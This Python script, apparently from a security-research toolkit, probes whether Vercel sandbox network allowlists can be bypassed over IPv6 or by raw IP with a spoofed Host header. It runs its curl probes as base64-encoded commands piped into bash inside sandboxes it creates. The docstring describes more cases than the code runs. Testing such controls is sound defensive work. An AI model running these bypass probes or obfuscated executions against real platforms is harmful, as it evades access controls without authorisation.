# -*- coding: utf-8 -*-
"""v52d: custom 模式 IPv6 是否受策略约束 (firewall bypass 决定性测试)
V1: custom+allowedDomains:[httpbin.org] 强制 -6 访问 example.com (不在白名单) -> 通=IPv6 绕过!
V2: 同上强制 -4 -> 对照 (预期拦)
V3: custom+allowedDomains:[example.com] -6 访问 example.com -> 正常放行对照
V4: deny-all 下 -6 -> 对照
V5: custom+allowedDomains:[httpbin.org] 直连 IPv6 地址 (example.com 的 IPv6)"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

def api_raw(method, path, body=None, timeout=180, maxlen=80000):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOKEN)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:maxlen]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:maxlen]
    except Exception as e:
        return -1, 'EXC %s' % str(e)[:120]

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def test(tag, name, policy):
    api_raw('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
    time.sleep(2)
    body = {"projectId": PROJ, "name": name, "networkPolicy": policy}
    c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % TEAM, body)
    print('[%s create] -> %d' % (tag, c), flush=True)
    if c != 200:
        print('  err:', r[:150], flush=True)
        return
    sid = json.loads(r)['sandbox']['currentSessionId']
    time.sleep(8)
    probe = ('echo "== -6 example.com (不在白名单) =="; timeout 10 curl -6 -sS -m 8 -o /dev/null -w "code=%{http_code} err=%{errormsg}" https://example.com/ 2>&1; echo; '
             'echo "== -4 example.com =="; timeout 10 curl -4 -sS -m 8 -o /dev/null -w "code=%{http_code} err=%{errormsg}" https://example.com/ 2>&1; echo; '
             'echo "== -6 httpbin.org (在白名单) =="; timeout 10 curl -6 -sS -m 8 -o /dev/null -w "code=%{http_code} err=%{errormsg}" https://httpbin.org/ip 2>&1; echo; '
             'echo "== -4 httpbin.org =="; timeout 10 curl -4 -sS -m 8 -o /dev/null -w "code=%{http_code} err=%{errormsg}" https://httpbin.org/ip 2>&1; echo; '
             'echo "== -6 直连 2606:4700:10::6814:179a (example.com IP, 带 Host) =="; timeout 10 curl -6 -sS -m 8 -o /dev/null -w "code=%{http_code} err=%{errormsg}" https://[2606:4700:10::6814:179a]/ -H "Host: example.com" 2>&1; echo; '
             'echo "== -4 直连 93.184.215.14 (example.com IP, 带 Host) =="; timeout 10 curl -4 -sS -m 8 -o /dev/null -w "code=%{http_code} err=%{errormsg}" https://93.184.215.14/ -H "Host: example.com" 2>&1; echo')
    b64 = base64.b64encode(probe.encode()).decode()
    c2, r2 = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
                     {"command": "bash", "args": ["-c", 'echo %s | base64 -d | bash' % b64],
                      "wait": True, "logs": True, "timeout": 90000}, timeout=150)
    out = parse_data(r2).strip()
    print('  %s' % out.replace('\n', '\n  ')[:800], flush=True)
    api_raw('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
    time.sleep(2)

if __name__ == '__main__':
    test('V1', 'v6_51a', {"mode": "custom", "allowedDomains": ["httpbin.org"]})
    test('V2', 'v6_51b', {"mode": "deny-all"})
    test('V3', 'v6_51c', {"mode": "custom", "allowedDomains": ["example.com", "httpbin.org"]})
    print('DONE', flush=True)
